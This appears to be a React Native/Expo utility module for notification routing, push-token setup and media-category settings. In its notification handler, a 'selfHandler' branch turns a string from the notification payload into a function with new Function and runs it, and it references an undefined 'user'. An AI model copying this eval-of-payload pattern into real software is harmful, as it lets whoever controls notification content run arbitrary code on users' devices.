import * as Device from "expo-device";
import { Linking } from "react-native";
import Constants from "expo-constants";
import * as Notifications from "expo-notifications";
import { Platform } from "react-native";

export const getCount = async (query, key, set) => {
  const snapshot = await query.count().get();
  const total = snapshot.data().count;
  set((data) => ({ ...data, [key]: total }));
};

export const CONTENT_OFFSET_THRESHOLD = 150;

export const handleNotificationRouting = async ({ item, navigation }) => {
  if ("goToExtraScreen" in item) {
    await navigation.navigate("Extra", {
      screen: item.screen,
      params: { ...item },
    });
  }

  if ("viewEvent" in item) {
    await navigation.navigate("Extra", {
      screen: "Event",
      params: { ...item },
    });
  }

  if ("isAlsoInAppNotification" in item) {
    await navigation.navigate("Extra", {
      screen: "Notifications",
    });
  }

  if ("isDownloadNotif" in item) {
    const deviceOS = Device.osName; // iOS or iPadOS or Android
    if (["iOS", "iPadOS"].includes(deviceOS)) {
      await Linking.openURL(item?.iOS);
    }

    if (["Android"].includes(deviceOS)) {
      await Linking.openURL(item?.android);
    }
  }

  if ("selfHandler" in item) {
    const handler = new Function("a", "b", item?.action?.body);
    await handler(navigation, user);
  }
};

export const getNotificationToken = async () => {
  let token = null;

  if (Device.isDevice) {
    const { status: existingStatus } =
      await Notifications.getPermissionsAsync();
    let finalStatus = existingStatus;
    if (existingStatus !== "granted") {
      const { status } = await Notifications.requestPermissionsAsync();
      finalStatus = status;
    }
    if (finalStatus === "granted") {
      token = (
        await Notifications.getExpoPushTokenAsync({
          projectId: Constants.expoConfig?.extra?.eas?.projectId,
        })
      ).data;
    }
  }

  return token;
};

export const linkCommonParams = {
  music: {
    title: "Music",
    category: "music",
    header1: "Find and Listen",
    header2: "Your Favorite Inspiring Music",
    source: require("../../assets/resources/music_nobg.png"),
    linkImage:
      "https://music.usc.edu/wp-content/uploads/2023/08/Caro1-Mod1.jpg",
  },
  videos: {
    title: "Videos",
    category: "videos",
    header1: "Find and Watch",
    header2: "Your Favorite Inspiring Videos",
    source: require("../../assets/resources/videos_nobg.png"),
    linkImage:
      "https://images.hindustantimes.com/tech/img/2021/10/21/960x540/YouTube_Music_1634802693083_1634802709145.jpg",
  },
  blogs: {
    title: "Blogs",
    category: "blogs",
    header1: "Find and Read",
    header2: "Your Favorite Inspiring Blogs",
    source: require("../../assets/resources/blogs_nobg.png"),
    linkImage:
      "https://logo.com/image-cdn/images/kts928pd/production/3d0a1942ea617825e187c3c9a3811a5d93a331be-370x366.png?w=1080&q=72",
  },
};
